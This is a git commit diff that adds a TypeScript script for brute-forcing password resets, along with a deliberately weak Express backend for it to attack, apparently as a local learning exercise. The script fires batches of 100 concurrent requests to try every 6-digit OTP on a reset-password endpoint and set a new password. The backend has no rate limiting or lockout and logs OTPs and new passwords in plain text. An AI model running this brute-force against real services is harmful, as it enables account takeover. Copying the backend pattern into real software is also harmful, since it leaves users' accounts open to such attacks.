7574ad58d1fe56f72379527e30ea53073770b957
shi code <kdshivayk@gmail.com>
2025-11-20 19:50:24 +0530

    code aadded with attacker logic

--- attack/src/index.ts
+++ attack/src/index.ts
@@ -3,8 +3,53 @@ import axios from 'axios';
 
 
 
-for ( let i=0 ; i<100000; i++){
-    axios.post("http://localhost:3000/reset-password", {
-        otp:i 
-    })
+
+
+ async function sendRequest (otp : string ){
+    let data = JSON.stringify({
+        "email": "abc@gamil.com",
+        "otp": otp,
+        "newPassword": "58"
+        });
+
+    let config = {
+        method: 'post',
+        maxBodyLength: Infinity,
+        url: 'http://localhost:3000/reset-password',
+        headers: { 
+            'Content-Type': 'application/json'
+        },
+        data : data
+    };
+
+    try {
+        await axios.request(config)
+    } catch(e){
+
+    }
 }
+// .then((response) => {
+//   console.log(JSON.stringify(response.data));
+// })
+// .catch((error) => {
+//   console.log(error);
+// });
+
+
+
+
+// sendRequest("279415");
+
+async function main (){
+    for ( let i=0; i<=999999; i+=100){
+     console.log("hello")
+    const arr = [];
+    console.log(i);
+    for ( let j=0 ; j<100; j++){
+        arr.push(sendRequest((i+j).toString()));   
+    }
+    // console.log(arr)
+    await Promise.all(arr);
+}}
+
+main();
--- backend/src/index.ts
+++ backend/src/index.ts
@@ -12,4 +12,32 @@ app.post ( "/generate-otp", (req, res )=>{
     if (!email){
          return res.status(400).json ({ message: "email is not found"})
     }
+
+    const otp = Math.floor(100000 + Math.random()*900000).toString(); // generate the 6-digit OTP 
+
+    otpStore[email]= otp;
+
+    console.log(`OTP for ${email}: ${otp}`);
+    res.status(200).json({message : "OTP generated and logged "})
+})
+
+
+app.post ( '/reset-password', ( req, res)=>{
+    const { email, otp, newPassword }= req.body;
+    if(!email || !otp || !newPassword ){
+        return res.status(400).json ({message : "Email, otp, new Password are required "})
+    }
+
+    if ( otpStore[email]=== otp){
+        console.log( `Password for ${email} has beeend rest to : ${newPassword}`);
+        delete otpStore[email]; // clear the OTP after use ;
+        return res.status(200).json({message: "passowrd has been reset sucdessfully"})
+    }
+    else {
+        res.status (401 ).json ({message: "INvalid OTP "})
+    }
+})
+
+app.listen ( 3000, ()=>{
+    console.log(" The backend is running in 3000")
 })
